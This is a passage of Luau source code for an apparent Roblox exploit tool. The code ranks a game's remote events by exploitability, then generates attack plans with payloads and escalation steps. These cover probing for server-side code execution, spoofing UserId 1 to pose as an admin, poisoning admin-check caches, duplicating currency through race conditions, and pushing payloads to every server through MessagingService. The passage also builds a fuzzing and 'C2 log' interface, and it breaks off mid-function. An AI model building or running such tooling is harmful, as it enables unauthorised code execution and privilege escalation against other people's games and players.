    { kw="sell",        weight=4,  signal="economy-state"     },
    { kw="trade",       weight=5,  signal="economy-state"     },
    { kw="transfer",    weight=5,  signal="economy-state"     },
    { kw="give",        weight=4,  signal="economy-state"     },
    -- Broadcast / fleet
    { kw="broadcast",   weight=7,  signal="fleet-ingress"     },
    { kw="publish",     weight=7,  signal="fleet-ingress"     },
    { kw="fleet",       weight=8,  signal="fleet-ingress"     },
    { kw="global",      weight=6,  signal="fleet-ingress"     },
    { kw="announce",    weight=5,  signal="fleet-ingress"     },
    -- Bindable identity drop patterns
    { kw="relay",       weight=6,  signal="bindable-relay"    },
    { kw="dispatch",    weight=6,  signal="bindable-relay"    },
    { kw="forward",     weight=5,  signal="bindable-relay"    },
    { kw="route",       weight=5,  signal="bindable-relay"    },
    { kw="handler",     weight=4,  signal="bindable-relay"    },
}

function LE:preScan(remotePath, rec)
    local name  = rec.inst.Name
    local lower = name:lower()
    local totalScore = 0
    local signals = {}

    for _, entry in ipairs(PRE_SCAN_EXEC_SINKS) do
        if lower:find(entry.kw, 1, true) then
            totalScore = totalScore + entry.weight
            table.insert(signals, entry.signal)
        end
    end

    -- Classify the dominant risk tier
    local tier
    if totalScore >= 15 then
        tier = "EXEC_SINK"       -- probable execution boundary
    elseif totalScore >= 10 then
        tier = "TRUST_BOUNDARY"  -- admin/auth/identity
    elseif totalScore >= 6 then
        tier = "FLEET_RISK"      -- broadcast/relay
    elseif totalScore >= 3 then
        tier = "STATE_RISK"      -- economy/state mutation
    else
        tier = "UNKNOWN"
    end

    return {
        path      = remotePath,
        name      = name,
        score     = totalScore,
        tier      = tier,
        signals   = signals,
        preScanTs = tick(),
    }
end

-- Sort discovered remotes by pre-scan score (highest risk first)
function LE:rankRemotes()
    local ranked = {}
    for path, rec in pairs(DAL.discovered) do
        local ps = self:preScan(path, rec)
        table.insert(ranked, ps)
    end
    table.sort(ranked, function(a, b) return a.score > b.score end)
    return ranked
end

-- -- Leverage Resolver --------------------------------------------
-- Given a violation, produce a concrete LeveragePlan.
-- This is the core of the engine -- each branch maps a violation
-- type to a specific technique, payload, node type, and step list.

local LEVERAGE_RULES = {

    [VTYPE.RCE_BOUNDARY] = function(v, preScan)
        return {
            technique    = "Execution Sink Injection",
            rceProximity = RCE_PROX.DIRECT,
            nodeType     = "EXEC_SINK",
            nodeLabel    = "** " .. (preScan and preScan.name or "RCE Target"),
            rationale    = "Server echoed an execution signature or this remote's name " ..
                           "directly matches a known exec sink. The data->instruction " ..
                           "boundary has been located. This is the ledge.",
            steps = {
                "1. Add this remote as an EXEC_SINK node in your S->S graph.",
                "2. Confirm the server evaluates string payloads by sending: " ..
                   "tostring(type(getfenv())) -- if it echoes back 'function', execution confirmed.",
                "3. Escalate to an environment dump probe: " ..
                   "send a payload that reads game.PlaceId from getfenv() and checks for echo.",
                "4. If execution confirmed: inject a persistent listener using a " ..
                   "BindableEvent as a command relay so you can issue further instructions " ..
                   "without re-firing the remote each time.",
                "5. Mark this chain CRITICAL in the Custody Ledger -- identity here is server.",
            },
            payload = "tostring(type(getfenv and getfenv() or load))",
        }
    end,

    [VTYPE.IDENTITY_LOSS] = function(v, preScan)
        return {
            technique    = "UserId Substitution via Bindable Drop",
            rceProximity = RCE_PROX.ONE_HOP,
            nodeType     = "IDENTITY_SPOOF",
            nodeLabel    = "[user] Identity Drop -- " .. (preScan and preScan.name or v.remotePath),
            rationale    = "This remote passes data to a downstream Bindable without " ..
                           "preserving the Player object. The receiving script identifies " ..
                           "the caller by a client-supplied value -- which you control.",
            steps = {
                "1. Add this remote as an IDENTITY_DROP node in your S->S graph.",
                "2. Fire the remote with UserId = 1 (Roblox admin) as the identity argument.",
                "3. Observe whether the downstream action is applied to a different player " ..
                   "or grants elevated permissions.",
                "4. If confirmed: chain this into a SESSION_CACHE write -- " ..
                   "poison the cache key that the admin-check system reads.",
                "5. From there, any remote that trusts that cache key now treats you as admin.",
                "6. Leverage admin status to locate a loadstring or require sink " ..
                   "that is gated behind the admin check you just bypassed.",
            },
            payload = "{ UserId = 1, Name = 'Roblox', Role = 'admin' }",
        }
    end,

    [VTYPE.SILENT_PROCESS] = function(v, preScan)
        local tier = preScan and preScan.tier or "UNKNOWN"
        local isHighValue = (tier == "EXEC_SINK" or tier == "TRUST_BOUNDARY")
        return {
            technique    = isHighValue
                and "Silent-Processing Exec Sink Escalation"
                or  "Silent-Processing State Mutation",
            rceProximity = isHighValue and RCE_PROX.ONE_HOP or RCE_PROX.STRUCTURAL,
            nodeType     = "SILENT_SINK",
            nodeLabel    = "[mute] Silent Sink -- " .. (preScan and preScan.name or v.remotePath),
            rationale    = "Server consumed malformed data without rejecting or erroring. " ..
                           "This means validation is absent -- the server is working with " ..
                           "whatever you send. " .. (isHighValue
                               and "Combined with this remote's exec-sink signals, " ..
                                   "silent processing here means injected code may run silently."
                               or  "The server's state can be corrupted without any " ..
                                   "visible error telling the developer something is wrong."),
            steps = {
                "1. Add this remote as a SILENT_SINK node in your S->S graph.",
                "2. Send progressively more dangerous payloads -- start with type mismatches, " ..
                   "escalate to environment probe strings.",
                "3. Watch for any state change in Leaderstats, character, or attributes " ..
                   "after each fire (DAL differential snapshot will catch this).",
                "4. If the remote has exec-sink signals: send the RCE probe battery " ..
                   "directly -- silent acceptance means no error wall to stop it.",
                "5. If state mutation confirmed: map which other systems read that state " ..
                   "and whether any of them touch a loadstring or require path.",
            },
            payload = "{ __type = 'probe', __exec = 'return game.PlaceId', x = math.huge }",
        }
    end,

    [VTYPE.DOUBLE_INGRESS] = function(v, preScan)
        return {
            technique    = "Fleet-Wide Broadcast Poisoning via Double Ingress",
            rceProximity = RCE_PROX.ONE_HOP,
            nodeType     = "FLEET_INGRESS",
            nodeLabel    = "[signal] Fleet Ingress -- " .. (preScan and preScan.name or v.remotePath),
            rationale    = "This remote feeds data into a MessagingService:PublishAsync " ..
                           "path. Any server in the fleet that subscribes and blindly " ..
                           "processes the incoming message will execute your payload. " ..
                           "One injection, every server.",
            steps = {
                "1. Add this remote as a FLEET_INGRESS node in your S->S graph.",
                "2. Confirm the double-ingress chain: fire this remote with a sentinel " ..
                   "value and watch whether other connected servers receive it via C2 log.",
                "3. Craft a poisoned payload targeting the receiving server's " ..
                   "SubscribeAsync handler -- look for Instance.new, DataStore writes, " ..
                   "or eval-style functions in the handler logic.",
                "4. If the handler does Instance.new(payload): send 'Script' as payload " ..
                   "to instantiate a bare server script.",
                "5. Achieving fleet-wide execution from a single client fire is the " ..
                   "highest-impact outcome -- log this chain immediately in Custody Ledger.",
            },
            payload = "{ __fleet_probe = true, __sentinel = 'DAL_FW_7f3a', data = '' }",
        }
    end,

    [VTYPE.RACE_PRECOND] = function(v, preScan)
        return {
            technique    = "Concurrent State Corruption (Race Condition)",
            rceProximity = RCE_PROX.STRUCTURAL,
            nodeType     = "RACE_TARGET",
            nodeLabel    = "** Race -- " .. (preScan and preScan.name or v.remotePath),
            rationale    = "This remote touches an economy or state value without a " ..
                           "confirmed debounce or mutex. Rapid concurrent fires can pass " ..
                           "the 'do they have enough?' check multiple times before the " ..
                           "first deduction is committed.",
            steps = {
                "1. Add this remote as a RACE_TARGET node in your S->S graph.",
                "2. Fire this remote 50-200 times in rapid succession using a tight loop.",
                "3. Observe whether the server processes more than one request before " ..
                   "the state is updated (check Leaderstats in DAL snapshot diff).",
                "4. If race confirmed: use the duplicated state to accumulate resources " ..
                   "that can then be spent on a higher-privilege action.",
                "5. Chain: race-duplicated currency -> buy admin item -> " ..
                   "admin item triggers loadstring path -> SB-RCE.",
            },
            payload = "-- Fire 100x in loop: remote:FireServer(itemId)",
        }
    end,

    [VTYPE.LOGIC_BYPASS] = function(v, preScan)
        return {
            technique    = "Assumption Violation -- Logic Bypass",
            rceProximity = RCE_PROX.STRUCTURAL,
            nodeType     = "BYPASS_POINT",
            nodeLabel    = "[exit] Bypass -- " .. (preScan and preScan.name or v.remotePath),
            rationale    = "The server is making a trust-based decision about this input " ..
                           "rather than a validation-based one. The developer assumed " ..
                           "something about what the client would send -- you violated that.",
            steps = {
                "1. Add this remote as a BYPASS_POINT node in your S->S graph.",
                "2. Identify the specific assumption being violated " ..
                   "(type, range, context, timing).",
                "3. Escalate the violation: if a string bypass works, try a table; " ..
                   "if a number bypass works, try math.huge or NaN.",
                "4. Map where the bypassed value flows next -- does it reach a " ..
                   "loadstring, require, or getfenv path downstream?",
                "5. If yes: you have a full Source->Bypass->Sink chain. " ..
                   "Apply all three nodes to the S->S graph and run EXECUTE.",
            },
            payload = v.payload or "math.huge",
        }
    end,

    [VTYPE.STATE_SPOOF] = function(v, preScan)
        return {
            technique    = "Differential State Mutation",
            rceProximity = RCE_PROX.STRUCTURAL,
            nodeType     = "STATE_SINK",
            nodeLabel    = "[stats] State Sink -- " .. (preScan and preScan.name or v.remotePath),
            rationale    = "A malformed payload caused unexpected server state to change. " ..
                           "The server is not isolating the effects of this remote. " ..
                           "Data intended for one system is bleeding into another.",
            steps = {
                "1. Add this remote as a STATE_SINK node in your S->S graph.",
                "2. Identify exactly which state changed (DAL snapshot diff shows this).",
                "3. Determine whether the mutated state is read by a security-sensitive " ..
                   "system (admin check, anti-cheat, DataStore write).",
                "4. If yes: this is a Lateral Transport Trust hole -- " ..
                   "poison this state deliberately with an identity or permission value.",
                "5. Chain into identity loss: mutated state -> admin check reads it -> " ..
                   "you are treated as admin -> exec sink access.",
            },
            payload = v.payload or "{ spoofed = true, role = 'admin', uid = 1 }",
        }
    end,
}

-- Fallback rule for violation types without a specific resolver
local function defaultLeverageRule(v, preScan)
    return {
        technique    = "General Assumption Violation",
        rceProximity = RCE_PROX.STRUCTURAL,
        nodeType     = "GENERIC_FINDING",
        nodeLabel    = "[!] Finding -- " .. (preScan and preScan.name or v.remotePath),
        rationale    = "A structural flaw was detected. " ..
                       "Map its downstream flow to determine exploit potential.",
        steps = {
            "1. Add this remote to your S->S graph.",
            "2. Trace where its output flows -- look for exec sinks downstream.",
            "3. Escalate probing on this remote with the RCE probe battery.",
        },
        payload = "--",
    }
end

-- -- Main resolve function -----------------------------------------
function LE:resolve(violation)
    local ruleFn = LEVERAGE_RULES[violation.vtype] or defaultLeverageRule

    -- Get pre-scan data if we have it for this remote
    local rec     = DAL.discovered[violation.remotePath]
    local preScan = rec and self:preScan(violation.remotePath, rec) or nil

    local plan    = ruleFn(violation, preScan)

    plan.id          = newPlanId()
    plan.timestamp   = tick()
    plan.remotePath  = violation.remotePath
    plan.vtype       = violation.vtype
    plan.severity    = violation.severity
    plan.applied     = false
    plan.preScan     = preScan

    table.insert(self.plans, 1, plan)
    if #self.plans > self.MAX_PLANS then table.remove(self.plans) end

    -- Push to DALSink
    DALSink:push({
        type      = "LEVERAGE",
        planId    = plan.id,
        technique = plan.technique,
        path      = plan.remotePath,
        prox      = plan.rceProximity,
    })

    if self.onPlan then self.onPlan(plan) end
    return plan
end

-- Auto-resolve every new violation as it comes in
-- Wire this up after DAL.onViolation is set
local _prevOnViolLE = DAL.onViolation
DAL.onViolation = function(v)
    if _prevOnViolLE then _prevOnViolLE(v) end
    if v then LE:resolve(v) end
end

-- -- Apply to Node -------------------------------------------------
-- Pushes a LeveragePlan into the S->S graph as a real node.
-- Reads the existing ssCtx node table and inserts a new entry.
function LE:applyToNode(plan)
    if plan.applied then return false, "Already applied" end

    -- ssCtx is defined in the main script scope. We reach it through
    -- the shared upvalue since DAL runs in the same chunk closure.
    if not ssCtx or not ssCtx.nodes then
        return false, "S->S graph context not available"
    end

    local nodeId = "dal_" .. plan.id:lower():gsub("-", "_")
    local newNode = {
        id       = nodeId,
        label    = plan.nodeLabel,
        kind     = plan.nodeType,
        x        = 80 + (#ssCtx.nodes * 22) % 400,
        y        = 60 + math.floor(#ssCtx.nodes / 18) * 60,
        dalPlan  = plan.id,
        note     = plan.technique,
    }

    table.insert(ssCtx.nodes, newNode)
    plan.applied = true

    DALSink:push({
        type    = "NODE_APPLIED",
        planId  = plan.id,
        nodeId  = nodeId,
        label   = plan.nodeLabel,
    })

    if self.onPlan then self.onPlan(plan) end
    return true, nodeId
end

-- -- Ranked scan shortcut ------------------------------------------
-- Run the pre-scanner across all discovered remotes, auto-generate
-- a leverage plan for every high-score remote without waiting for
-- fuzzing to produce a violation first.
function LE:scanAndResolveAll()
    local ranked = self:rankRemotes()
    local count  = 0
    for _, ps in ipairs(ranked) do
        if ps.score >= 6 then  -- only surface meaningful signals
            -- Synthesize a lightweight violation record from pre-scan
            local syntheticV = {
                id         = "prescan_" .. ps.path,
                timestamp  = tick(),
                vtype      = (ps.tier == "EXEC_SINK"     and VTYPE.RCE_BOUNDARY)
                          or (ps.tier == "TRUST_BOUNDARY" and VTYPE.IDENTITY_LOSS)
                          or (ps.tier == "FLEET_RISK"     and VTYPE.DOUBLE_INGRESS)
                          or VTYPE.LOGIC_BYPASS,
                severity   = (ps.score >= 15 and SEV.CRITICAL)
                          or (ps.score >= 10 and SEV.HIGH)
                          or SEV.MEDIUM,
                remotePath = ps.path,
                payload    = "static:pre-scan",
                evidence   = "Pre-scan score " .. ps.score ..
                             " -- signals: " .. table.concat(ps.signals, ", "),
                traceId    = "PRESCAN",
                mode       = DAL.mode,
            }
            self:resolve(syntheticV)
            count = count + 1
        end
    end
    return count, ranked
end

-- ==================================================================
--   UI PANEL
--   420 x 510 draggable panel with 4 tabs:
--     [REMOTES]    -- discovered remote list, per-remote fuzz button
--     [VIOLATIONS] -- live violation registry with severity colour coding
--     [FUZZER]     -- mutation library display, global fuzz controls
--     [C2 LOG]     -- raw DALSink sink stream
-- ==================================================================
local PANEL_W, PANEL_H = 420, 510
local COL = {
    BG     = Color3.fromRGB(10,  12,  20),
    HDR    = Color3.fromRGB(18,  22,  36),
    BORDER = Color3.fromRGB(80, 110, 200),
    TEXT   = Color3.fromRGB(220, 228, 248),
    DIM    = Color3.fromRGB(110, 125, 165),
    ROW    = Color3.fromRGB(18,  22,  38),
    SEL    = Color3.fromRGB(40,  50,  80),
}

-- UI micro-helpers (self-contained, no dependency on parent tool)
local function uiCorner(inst, r)
    local c = Instance.new("UICorner")
    c.CornerRadius = UDim.new(0, r or 6)
    c.Parent = inst
end

local function uiStroke(inst, col, trans, thick)
    local s = Instance.new("UIStroke")
    s.Color        = col   or COL.BORDER
    s.Transparency = trans or 0.45
    s.Thickness    = thick or 1
    s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    s.Parent = inst
    return s
end

local function mkFrame(parent, x, y, w, h, col, alpha, zi)
    local f = Instance.new("Frame")
    f.Position               = UDim2.fromOffset(x, y)
    f.Size                   = UDim2.fromOffset(w, h)
    f.BackgroundColor3       = col   or COL.BG
    f.BackgroundTransparency = alpha or 0
    f.BorderSizePixel        = 0
    f.ZIndex                 = zi or 1
    f.Parent                 = parent
    return f
end

local function mkLabel(parent, x, y, w, h, text, size, col, xalign, zi)
    local l = Instance.new("TextLabel")
    l.Position               = UDim2.fromOffset(x, y)
    l.Size                   = UDim2.fromOffset(w, h)
    l.BackgroundTransparency = 1
    l.Text                   = text   or ""
    l.TextSize               = size   or 9
    l.Font                   = Enum.Font.GothamBold
    l.TextColor3             = col    or COL.TEXT
    l.TextXAlignment         = xalign or Enum.TextXAlignment.Left
    l.TextYAlignment         = Enum.TextYAlignment.Center
    l.TextWrapped            = false
    l.TextTruncate           = Enum.TextTruncate.AtEnd
    l.BorderSizePixel        = 0
    l.ZIndex                 = zi or 1
    l.Parent                 = parent
    return l
end

local function mkBtn(parent, x, y, w, h, text, bgCol, textCol, zi)
    local b = Instance.new("TextButton")
    b.Position               = UDim2.fromOffset(x, y)
    b.Size                   = UDim2.fromOffset(w, h)
    b.BackgroundColor3       = bgCol   or COL.SEL
    b.BackgroundTransparency = 0.65
    b.BorderSizePixel        = 0
    b.Text                   = text    or ""
    b.TextSize               = 8
    b.Font                   = Enum.Font.GothamBold
    b.TextColor3             = textCol or COL.TEXT
    b.AutoButtonColor        = false
    b.ZIndex                 = zi or 1
    b.Parent                 = parent
    uiCorner(b, 4)
    uiStroke(b, bgCol or COL.BORDER, 0.55, 1)
    b.MouseEnter:Connect(function()
        TweenService:Create(b, TweenInfo.new(0.08), { BackgroundTransparency = 0.35 }):Play()
    end)
    b.MouseLeave:Connect(function()
        TweenService:Create(b, TweenInfo.new(0.08), { BackgroundTransparency = 0.65 }):Play()
    end)
    return b
end

-- -- Severity badge ------------------------------------------------
local function mkSevBadge(parent, x, y, sev)
    local bg = mkFrame(parent, x, y, 58, 14, sev.col, 0.65, parent.ZIndex + 1)
    uiCorner(bg, 3)
    local lbl = mkLabel(bg, 0, 0, 58, 14, sev.label, 7, sev.col,
        Enum.TextXAlignment.Center, bg.ZIndex + 1)
    return bg
end

-- -- Scrolling container helper ------------------------------------
local function mkScroll(parent, x, y, w, h, zi)
    local s = Instance.new("ScrollingFrame")
    s.Position                = UDim2.fromOffset(x, y)
    s.Size                    = UDim2.fromOffset(w, h)
    s.BackgroundTransparency  = 1
    s.BorderSizePixel         = 0
    s.ScrollBarThickness      = 3
    s.ScrollBarImageColor3    = COL.BORDER
    s.ScrollBarImageTransparency = 0.40
    s.CanvasSize              = UDim2.fromOffset(0, 0)
    s.ZIndex                  = zi or 1
    s.Parent                  = parent
    local ll = Instance.new("UIListLayout")
    ll.SortOrder = Enum.SortOrder.LayoutOrder
    ll.Padding   = UDim.new(0, 2)
    ll.Parent    = s
    return s
end

-- -- Main panel builder --------------------------------------------
-- NOTE: DAL now lives inside its own dedicated tab page (built and
-- captured earlier as DALPage), not floating inside the shared
-- ContentArea. The root frame fills that page completely instead of
-- using a fixed pixel size + manual drag -- the outer tool's own
-- drag/resize already covers that, so DAL just needs to fill its slot.
-- ====================================================================
--   TAB BUILDERS -- split out of buildPanel
--   Luau caps every function body at 200 local registers. The original
--   monolithic buildPanel() built all four tabs inline and blew past
--   that limit. Each tab now gets its own function and its own
--   independent 200-register budget.
-- ====================================================================

-- -- TAB 1 -- REMOTES -------------------------------------------------
local function buildRemotesTab(remPage, PW, PH, switchTab)
    local remBar = mkFrame(remPage, 0, 0, PW, 26, Color3.new(0,0,0), 1, 52)
    local crawlBtn    = mkBtn(remBar,  4,  4,  54, 18, "CRAWL",
        Color3.fromRGB(90,180,255), Color3.fromRGB(90,180,255), 53)
    local fuzzAllBtn  = mkBtn(remBar, 62,  4,  62, 18, "FUZZ ALL",
        Color3.fromRGB(220,175,50), Color3.fromRGB(220,175,50), 53)
    local ingressBtn  = mkBtn(remBar,128,  4,  82, 18, "MAP INGRESS",
        Color3.fromRGB(220,120,50), Color3.fromRGB(220,120,50), 53)
    local raceBtn     = mkBtn(remBar,214,  4,  74, 18, "RACE SCAN",
        Color3.fromRGB(180, 80,255), Color3.fromRGB(180,80,255), 53)

    local remCountLbl = mkLabel(remBar, PW - 80, 0, 74, 26,
        "0 remotes", 7, COL.DIM, Enum.TextXAlignment.Right, 53)

    local remScroll = mkScroll(remPage, 2, 28, PW - 4, PH - 30, 52)

    local function rebuildRemoteList()
        for _, c in ipairs(remScroll:GetChildren()) do
            if c:IsA("Frame") then c:Destroy() end
        end
        local count = 0
        for path, rec in pairs(DAL.discovered) do
            count = count + 1
            local row = mkFrame(remScroll, 0, 0, PW - 14, 24, COL.ROW, 0.35, 53)
            row.LayoutOrder = count
            uiCorner(row, 3)

            local kindCol = rec.kind == "RemoteEvent"
                and Color3.fromRGB(90,180,255)
                or  Color3.fromRGB(255,160,80)
            local kBg = mkFrame(row, 4, 5, 18, 14, kindCol, 0.65, 54)
            uiCorner(kBg, 3)
            mkLabel(kBg, 0, 0, 18, 14,
                rec.kind == "RemoteEvent" and "RE" or "RF",
                6, kindCol, Enum.TextXAlignment.Center, 55)

            mkLabel(row, 26, 0, PW - 150, 24, path, 7, COL.TEXT,
                Enum.TextXAlignment.Left, 54)

            mkLabel(row, PW - 120, 0, 40, 24,
                rec.probeCount .. "p", 7, COL.DIM,
                Enum.TextXAlignment.Right, 54)

            local fb = mkBtn(row, PW - 76, 5, 34, 14, "FUZZ",
                Color3.fromRGB(220,175,50), Color3.fromRGB(220,175,50), 54)
            local rb = mkBtn(row, PW - 38, 5, 30, 14, "RCE",
                Color3.fromRGB(200,40,220), Color3.fromRGB(200,40,220), 54)

            local captPath = path
            fb.MouseButton1Click:Connect(function()
                fb.Text = "..."
                DAL:fuzzRemote(captPath, nil, function()
                    fb.Text = "[OK]"
                end)
            end)
            rb.MouseButton1Click:Connect(function()
                rb.Text = "..."
                DAL:probeRCEBoundary(captPath, function()
                    rb.Text = "[OK]"
                    switchTab(2)
                end)
            end)
        end
        remScroll.CanvasSize = UDim2.fromOffset(0, count * 26)
        remCountLbl.Text = count .. " remote" .. (count == 1 and "" or "s")
    end

    crawlBtn.MouseButton1Click:Connect(function()
        crawlBtn.Text = "..."
        DAL:crawl()
        crawlBtn.Text = "CRAWL"
        rebuildRemoteList()
    end)
    fuzzAllBtn.MouseButton1Click:Connect(function()
        fuzzAllBtn.Text = "RUNNING..."
        DAL:fuzzAll(nil, function()
            fuzzAllBtn.Text = "FUZZ ALL"
        end)
    end)
    ingressBtn.MouseButton1Click:Connect(function()
        DAL:mapDoubleIngress()
        switchTab(2)
    end)
    raceBtn.MouseButton1Click:Connect(function()
        DAL:scanRacePreconditions()
        switchTab(2)
    end)

    task.spawn(function()
        DAL:crawl()
        rebuildRemoteList()
    end)

    return rebuildRemoteList
end

-- -- TAB 2 -- VIOLATIONS ----------------------------------------------
local function buildViolationsTab(violPage, PW, PH)
    local ROW_H  = 68   -- taller rows to fit the LEVERAGE button
    local violScroll = mkScroll(violPage, 2, 2, PW - 4, PH - 4, 52)

    local function rebuildViolations()
        for _, c in ipairs(violScroll:GetChildren()) do
            if c:IsA("Frame") then c:Destroy() end
        end
        for i, v in ipairs(DAL.violations) do
            local row = mkFrame(violScroll, 0, 0, PW - 14, ROW_H, COL.ROW, 0.30, 53)
            row.LayoutOrder = i
            uiCorner(row, 4)

            -- Severity stripe
            local stripe = mkFrame(row, 0, 0, 3, ROW_H, v.severity.col, 0.15, 54)
            uiCorner(stripe, 2)

            -- Severity badge
            mkSevBadge(row, 7, 5, v.severity)

            -- Violation type
            mkLabel(row, 69, 3, PW - 230, 16, v.vtype, 8, COL.TEXT,
                Enum.TextXAlignment.Left, 54)

            -- Mode badge
            mkLabel(row, PW - 155, 3, 50, 14,
                "Mode " .. v.mode, 6, COL.DIM,
                Enum.TextXAlignment.Right, 54)

            -- Remote path
            mkLabel(row, 7, 21, PW - 20, 13,
                "-> " .. v.remotePath, 7, COL.DIM,
                Enum.TextXAlignment.Left, 54)

            -- Evidence
            mkLabel(row, 7, 36, PW - 20, 13,
                v.evidence:sub(1, 80), 7, Color3.fromRGB(160,175,210),
                Enum.TextXAlignment.Left, 54)

            -- -- LEVERAGE button ----------------------------------
            local leverageBtn = mkBtn(row, 7, ROW_H - 22, 110, 18,
                "[DAL] LEVERAGE >  S->S",
                Color3.fromRGB(200,40,220), Color3.fromRGB(200,40,220), 55)

            -- Apply-to-node shortcut button
            local applyBtn = mkBtn(row, 122, ROW_H - 22, 90, 18,
                "APPLY TO NODE",
                Color3.fromRGB(40,160,80), Color3.fromRGB(40,160,80), 55)

            local captV = v
            leverageBtn.MouseButton1Click:Connect(function()
                local report = DAL:getLeverageReport(captV)
                DAL.showLeveragePanel(violPage.Parent, captV, report)
            end)

            applyBtn.MouseButton1Click:Connect(function()
                applyBtn.Text = "..."
                local report = DAL:getLeverageReport(captV)
                local ok, result = DAL:applyToNode(report)
                if ok then
                    applyBtn.Text = "[OK] Added"
                    task.delay(2, function() applyBtn.Text = "APPLY TO NODE" end)
                else
                    -- Surface the reason so the user knows what to do
                    applyBtn.Text = "[!] " .. tostring(result):sub(1, 30)
                    task.delay(4, function() applyBtn.Text = "APPLY TO NODE" end)
                end
            end)
        end
        violScroll.CanvasSize = UDim2.fromOffset(0, #DAL.violations * (ROW_H + 2))
    end

    local _prevOnViol = DAL.onViolation
    DAL.onViolation = function(v)
        if _prevOnViol then _prevOnViol(v) end
        rebuildViolations()
    end

    return rebuildViolations
end

-- -- TAB 3 -- FUZZER --------------------------------------------------
local function buildFuzzerTab(fuzzPage, PW, PH, rebuildViolations)
    mkLabel(fuzzPage, 8, 4, PW - 16, 18,
        "Select a remote on the REMOTES tab and press FUZZ,",
        7, COL.DIM, Enum.TextXAlignment.Left, 52)
    mkLabel(fuzzPage, 8, 18, PW - 16, 14,
        "or use FUZZ ALL to run all phases against every discovered remote.",
        7, COL.DIM, Enum.TextXAlignment.Left, 52)

    local mutScroll = mkScroll(fuzzPage, 2, 36, PW - 4, PH - 80, 52)

    local phaseColors = {
        ["Type Confusion"]  = Color3.fromRGB( 90, 180, 255),
        ["Deep Nesting"]    = Color3.fromRGB(180, 100, 255),
        ["Identity Sub."]   = Color3.fromRGB(255, 160,  60),
        ["RCE (Mode 2)"]    = Color3.fromRGB(200,  40, 220),
    }

    local function buildMutDisplay()
        local allMuts = {}
        for _, m in ipairs(MUTATIONS.TYPE_CONFUSION) do
            table.insert(allMuts, { phase="Type Confusion", m=m })
        end
        for _, m in ipairs(MUTATIONS.DEEP_NEST) do
            table.insert(allMuts, { phase="Deep Nesting", m=m })
        end
        table.insert(allMuts, { phase="Identity Sub.", m={ label="UserId substitution (runtime)", payload="..." } })
        table.insert(allMuts, { phase="Identity Sub.", m={ label="Name substitution (runtime)",   payload="..." } })
        for _, m in ipairs(MUTATIONS.RCE_PROBES) do
            table.insert(allMuts, { phase="RCE (Mode 2)", m=m })
        end

        for i, entry in ipairs(allMuts) do
            local row = mkFrame(mutScroll, 0, 0, PW - 14, 18, COL.ROW, 0.50, 53)
            row.LayoutOrder = i
            uiCorner(row, 3)
            local pc = phaseColors[entry.phase] or COL.DIM
            local pBg = mkFrame(row, 3, 2, 84, 14, pc, 0.72, 54)
            uiCorner(pBg, 3)
            mkLabel(pBg, 0, 0, 84, 14, entry.phase, 6, pc,
                Enum.TextXAlignment.Center, 55)
            mkLabel(row, 92, 0, PW - 108, 18,
                entry.m.label .. "  ->  " .. tostring(entry.m.payload):sub(1,50),
                7, COL.TEXT, Enum.TextXAlignment.Left, 54)
        end
        mutScroll.CanvasSize = UDim2.fromOffset(0, #allMuts * 20)
    end
    buildMutDisplay()

    local clearBtn = mkBtn(fuzzPage, 8, PH - 38, PW - 16, 22,
        "CLEAR ALL VIOLATIONS",
        Color3.fromRGB(228, 60, 80), Color3.fromRGB(228, 60, 80), 52)
    clearBtn.MouseButton1Click:Connect(function()
        DAL:clearViolations()
        DALSink:clear()
        rebuildViolations()
    end)
end

-- -- TAB 4 -- C2 LOG --------------------------------------------------
local function buildC2LogTab(c2Page, PW, PH)
    local c2Scroll = mkScroll(c2Page, 2, 2, PW - 4, PH - 4, 52)

    local C2_SEV_COL = {
        INFO     = Color3.fromRGB(110, 125, 165),
        LOW      = Color3.fromRGB( 90, 180, 255),
        MEDIUM   = Color3.fromRGB(220, 175,  50),
        HIGH     = Color3.fromRGB(220, 120,  50),
        CRITICAL = Color3.fromRGB(228,  60,  80),
        ["SB-RCE"] = Color3.fromRGB(200,  40, 220),
        DISCOVERY  = Color3.fromRGB( 80, 200, 140),
    }

    local function rebuildC2()
        for _, c in ipairs(c2Scroll:GetChildren()) do
            if c:IsA("Frame") then c:Destroy() end
        end
        for i, entry in ipairs(DALSink.log) do
            local row = mkFrame(c2Scroll, 0, 0, PW - 14, 16,
                Color3.new(0,0,0), 1, 53)
            row.LayoutOrder = i

            local entryCol = entry.type == "DISCOVERY"
                and C2_SEV_COL.DISCOVERY
                or  (C2_SEV_COL[entry.sev] or COL.DIM)

            local prefix = entry.type == "DISCOVERY"
                and string.format("[DISC] %s", entry.path or "")
                or  string.format("[%s] %s -- %s",
                        entry.sev   or "?",
                        entry.path  or "",
                        (entry.evidence or ""):sub(1, 55))

            mkLabel(row, 3, 0, PW - 12, 16, prefix, 7, entryCol,
                Enum.TextXAlignment.Left, 54)
        end
        c2Scroll.CanvasSize = UDim2.fromOffset(0, #DALSink.log * 18)
    end

    DALSink.onEntry = function(_) rebuildC2() end
end

-- -- STATS DASHBOARD --------------------------------------------------
-- Always-visible live counters: remotes found, total violations,
-- critical+ count, confirmed SB-RCE count. This is what makes DAL
-- read as a live control center instead of a static list -- numbers
-- that visibly tick up and pulse as the tool works.
local function buildStatsBar(root, PW)
    local bar = Instance.new("Frame")
    bar.Name                   = "StatsBar"
    bar.Position               = UDim2.fromOffset(0, 32)
    bar.Size                   = UDim2.new(1, 0, 0, 34)
    bar.BackgroundColor3       = Color3.fromRGB(8, 10, 18)
    bar.BackgroundTransparency = 0.05
    bar.BorderSizePixel        = 0
    bar.ZIndex                 = 51
    bar.Parent                 = root

    local function statBlock(x, label, color)
        local w = 100
        local f = Instance.new("Frame")
        f.Position               = UDim2.fromOffset(x, 4)
        f.Size                   = UDim2.fromOffset(w, 26)
        f.BackgroundColor3       = color
        f.BackgroundTransparency = 0.82
        f.BorderSizePixel        = 0
        f.ZIndex                 = 52
        f.Parent                 = bar
        uiCorner(f, 5)
        uiStroke(f, color, 0.45, 1)

        local num = Instance.new("TextLabel")
        num.Position               = UDim2.fromOffset(6, 1)
        num.Size                   = UDim2.fromOffset(34, 24)
        num.BackgroundTransparency = 1
        num.Text                   = "0"
        num.Font                   = Enum.Font.GothamBlack
        num.TextSize               = 16
        num.TextColor3             = color
        num.TextXAlignment         = Enum.TextXAlignment.Left
        num.ZIndex                 = 53
        num.Parent                 = f

        local lbl = Instance.new("TextLabel")
        lbl.Position               = UDim2.fromOffset(40, 0)
        lbl.Size                   = UDim2.fromOffset(w - 44, 26)
        lbl.BackgroundTransparency = 1
        lbl.Text                   = label
        lbl.Font                   = Enum.Font.GothamBold
